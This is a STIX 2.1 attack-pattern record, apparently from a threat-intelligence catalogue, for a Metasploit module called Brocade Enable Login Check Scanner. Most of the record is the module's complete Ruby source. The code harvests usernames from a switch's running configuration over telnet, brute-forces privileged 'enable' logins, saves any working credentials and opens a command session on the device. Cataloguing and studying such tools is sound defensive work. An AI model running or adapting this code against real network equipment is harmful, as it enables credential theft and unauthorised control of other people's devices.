{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b46bbb0b-3fba-4911-aad6-f7f4993a3ef1",
    "created": "2024-08-14T16:26:40.467559Z",
    "modified": "2024-08-14T16:26:40.467563Z",
    "name": "Brocade Enable Login Check Scanner",
    "description": " This module will test a range of Brocade network devices for a privileged logins and report successes. The device authentication mode must be set as 'aaa authentication enable default local'. Telnet authentication, e.g. 'enable telnet authentication', should not be enabled in the device configuration.  This module has been tested against the following devices: ICX6450-24 SWver 07.4.00bT311 FastIron WS 624 SWver 07.2.02fT7e1 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/telnet/brocade_enable_login.rb",
            "external_id": "brocade_enable_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/telnet'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Telnet\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::CommandShell\n\n  def initialize\n    super(\n      'Name'        => 'Brocade Enable Login Check Scanner',\n      'Description' => %q{\n        This module will test a range of Brocade network devices for a\n        privileged logins and report successes. The device authentication mode\n        must be set as 'aaa authentication enable default local'.\n        Telnet authentication, e.g. 'enable telnet authentication', should not\n        be enabled in the device configuration.\n\n        This module has been tested against the following devices:\n              ICX6450-24 SWver 07.4.00bT311,\n              FastIron WS 624 SWver 07.2.02fT7e1\n      },\n      'Author'      => 'h00die <mike[at]shorebreaksecurity.com>',\n      'References'  =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'     => MSF_LICENSE\n    )\n    register_options(\n      [\n        OptBool.new('GET_USERNAMES_FROM_CONFIG', [ false, 'Pull usernames from config and running config', true])\n      ], self.class\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n\n    @no_pass_prompt = []\n  end\n\n  def get_username_from_config(un_list,ip)\n    [\"config\", \"running-config\"].each do |command|\n      print_status(\" Attempting username gathering from #{command} on #{ip}\")\n      sock.puts(\"\\r\\n\") # ensure that the buffer is clear\n      config = sock.recv(1024)\n      sock.puts(\"show #{command}\\r\\n\")\n\n      # pull the entire config\n      while true do\n        sock.puts(\" \\r\\n\") # paging\n        config << sock.recv(1024)\n        # Read until we are back at a prompt and have received the 'end' of\n        # the config.\n        break if config.match(/>$/) and config.match(/end/)\n      end\n\n      config.each_line do |un|\n        if un.match(/^username/)\n          found_username = un.split(\" \")[1].strip\n          un_list.push(found_username)\n          print_status(\"   Found: #{found_username}@#{ip}\")\n        end\n      end\n    end\n  end\n\n  attr_accessor :no_pass_prompt\n  attr_accessor :password_only\n\n  def run_host(ip)\n    un_list = []\n    if datastore['GET_USERNAMES_FROM_CONFIG']\n        connect()\n        get_username_from_config(un_list,ip)\n        disconnect()\n    end\n\n    if datastore['USERNAME'] #put the provided username on the array to try\n        un_list.push(datastore['USERNAME'])\n    end\n\n    un_list.delete('logout') #logout, even when used as a un or pass will exit the terminal\n\n    un_list.each do |un|\n      cred_collection = build_credential_collection(\n          username: datastore['USERNAME'],\n          password: datastore['PASSWORD']\n      )\n\n      scanner = Metasploit::Framework::LoginScanner::Telnet.new(\n          host: ip,\n          port: rport,\n          proxies: datastore['PROXIES'],\n          cred_details: cred_collection,\n          stop_on_success: datastore['STOP_ON_SUCCESS'],\n          bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n          connection_timeout: datastore['Timeout'],\n          max_send_size: datastore['TCP::max_send_size'],\n          send_delay: datastore['TCP::send_delay'],\n          banner_timeout: datastore['TelnetBannerTimeout'],\n          telnet_timeout: datastore['TelnetTimeout'],\n          pre_login: lambda { |s| raw_send(\"enable\\r\\n\", s.sock) },\n          framework: framework,\n          framework_module: self,\n          ssl: datastore['SSL'],\n          ssl_version: datastore['SSLVersion'],\n          ssl_verify_mode: datastore['SSLVerifyMode'],\n          ssl_cipher: datastore['SSLCipher'],\n          local_port: datastore['CPORT'],\n          local_host: datastore['CHOST']\n      )\n\n      scanner.scan! do |result|\n        credential_data = result.to_h\n        credential_data.merge!(\n            module_fullname: self.fullname,\n            workspace_id: myworkspace_id\n        )\n\n        if result.success?\n          credential_core = create_credential(credential_data)\n          credential_data[:core] = credential_core\n          create_credential_login(credential_data)\n          print_good(\"#{ip}:#{rport} - Login Successful: #{result.credential}\")\n          start_telnet_session(ip,rport,result.credential.public,result.credential.private,scanner)\n        else\n          invalidate_login(credential_data)\n          print_error(\"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\")\n        end\n      end\n    end\n  end\n\n  def start_telnet_session(host, port, user, pass, scanner)\n    print_status(\"Attempting to start session #{host}:#{port} with #{user}:#{pass}\")\n    merge_me = {\n      'USERPASS_FILE' => nil,\n      'USER_FILE'     => nil,\n      'PASS_FILE'     => nil,\n      'USERNAME'      => user,\n      'PASSWORD'      => pass\n    }\n\n    start_session(self, \"TELNET #{user}:#{pass} (#{host}:#{port})\", merge_me, true, scanner.sock) if datastore['CreateSession']\n  end\nend\n"
}